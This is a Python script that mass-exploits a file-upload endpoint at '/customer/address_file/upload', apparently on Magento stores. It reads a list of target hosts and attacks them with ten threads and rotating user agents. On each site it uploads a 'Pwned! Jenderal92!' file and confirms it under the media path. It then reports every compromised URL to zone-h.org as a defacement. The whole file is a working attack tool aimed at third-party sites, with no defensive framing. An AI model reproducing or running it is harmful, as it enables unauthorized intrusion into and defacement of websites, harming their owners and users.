# -*- coding: utf-8 -*-
from __future__ import print_function, absolute_import

import requests
import random
import string
import urllib3
import sys
import threading
from Queue import Queue

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0",
]

print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    return url.rstrip('/')

def random_form_key(length=16):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def verify_media_file(base_host, file_path, expected_content, timeout=15):
    possible_paths = [
        "/media/customer_address",
        "/pub/media/customer_address"
    ]
    for path_prefix in possible_paths:
        media_url = base_host + path_prefix + file_path
        try:
            check = requests.get(media_url, verify=False, timeout=timeout)
            if check.status_code == 200 and expected_content in check.text:
                return True, media_url
        except:
            continue
    return False, None

def upload_txt(host, timeout=15):
    host = normalize_url(host)
    form_key = random_form_key()
    
    file_content = '''
    UR TEXT HERE
  Pwned! Jenderal92!
'''
    
    file_name = "Jenderal92.txt"

    files = {
        "form_key": (None, form_key),
        "custom_attributes[country_id]": (file_name, file_content, "text/plain")
    }

    cookies = {"form_key": form_key}
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
    }

    try:
        r = requests.post(
            host + "/customer/address_file/upload",
            files=files,
            cookies=cookies,
            headers=headers,
            verify=False,
            timeout=timeout
        )

        if r.status_code != 200:
            return False, "HTTP {}".format(r.status_code)

        data = r.json()
        file_path = data.get("file")
        if not file_path:
            return False, "JSON missing 'file'"

        success, media_url = verify_media_file(host, file_path, file_content, timeout)
        if success:
            return True, media_url
        else:
            return False, "Content verification failed (tried /media/ and /pub/media/)"

    except requests.exceptions.Timeout:
        return False, "Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, "Exception: {}".format(str(e)[:100])

def submit_to_zoneh(full_media_url):
    try:
        if not full_media_url.startswith(('http://', 'https://')):
            full_media_url = 'http://' + full_media_url

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        }
        data = {
            'defacer': 'YOUR NICKNAME HERE',
            'domain1': full_media_url,
            'hackmode': '1',
            'reason': '1',
        }
        req = requests.post('http://www.zone-h.org/notify/single', headers=headers, data=data, timeout=30)
        if 'OK' in req.text:
            safe_print("    [Zone-H] Submitted : OK for {}".format(full_media_url))
        else:
            safe_print("    [Zone-H] Submitted : ERROR for {}".format(full_media_url))
    except Exception as e:
        safe_print("    [Zone-H] Error: {}".format(str(e)))

def worker(q, results):
    while True:
        host = q.get()
        if host is None:
            break
        safe_print("[*] Testing: {}".format(host))
        success, info = upload_txt(host)
        if success:
            safe_print("[+] SUCCESS | {}".format(host))
            safe_print("    Media URL: {}".format(info))
            results.append((host, True, info))
            submit_to_zoneh(info)
        else:
            safe_print("[-] FAILED  | {} | Reason: {}".format(host, info))
            results.append((host, False, info))
        q.task_done()

def main():
    if len(sys.argv) != 2:
        print("Usage: python upload_test.py list.txt")
        sys.exit(1)

    list_file = sys.argv[1]
    try:
        with open(list_file, "r") as f:
            hosts = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("[-] Cannot read {}: {}".format(list_file, e))
        sys.exit(1)

    if not hosts:
        print("[-] No targets found.")
        sys.exit(1)

    print("[+] Loaded {} targets. Starting multithreaded scan (10 workers)...".format(len(hosts)))
    print("-" * 60)

    num_workers = 10
    q = Queue()
    results = []

    for host in hosts:
        q.put(host)

    threads = []
    for _ in range(num_workers):
        t = threading.Thread(target=worker, args=(q, results))
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    for _ in range(num_workers):
        q.put(None)
    for t in threads:
        t.join()

    print("\n" + "=" * 60)
    success_count = sum(1 for _, success, _ in results if success)
    print("Summary: {}/{} targets vulnerable".format(success_count, len(hosts)))
    if success_count > 0:
        print("Vulnerable hosts:")
        for host, success, url in results:
            if success:
                print("  - {} -> {}".format(host, url))

if __name__ == "__main__":
    main()
